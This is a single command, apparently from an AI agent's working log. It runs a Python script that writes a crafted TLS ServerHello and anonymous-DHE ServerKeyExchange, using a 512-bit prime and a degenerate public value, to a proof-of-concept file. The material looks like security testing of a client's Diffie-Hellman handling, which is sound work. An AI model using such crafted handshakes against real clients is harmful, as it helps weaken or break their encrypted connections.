Running command: cd /workspace && python3 -c "
import struct

def record(typ, ver, payload):
    return b'\x16' + ver + struct.pack('>H', len(payload)) + payload

def handshake(htype, body):
    return bytes([htype]) + struct.pack('>I', len(body))[1:] + body

# 512-bit prime
p_val = 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503042159
p_bytes = p_val.to_bytes(64, 'big')
g_bytes = b'\x02'
pub_bytes = b'\x02'

# ServerHello
sh_body = b'\x03\x03' + b'\x00'*32 + b'\x00' + struct.pack('>H', 0x0034) + b'\x00' + b'\x00\x00'
sh = handshake(2, sh_body)

# ServerKeyExchange (anonymous DHE)
ske_body = struct.pack('>H', len(p_bytes)) + p_bytes + struct.pack('>H', len(g_bytes)) + g_bytes + struct.pack('>H', len(pub_bytes)) + pub_bytes
ske = handshake(12, ske_body)

data = record(22, b'\x03\x03', sh) + record(22, b'\x03\x03', ske)
open('/workspace/poc.bin','wb').write(data)
print('poc size:', len(data))
"
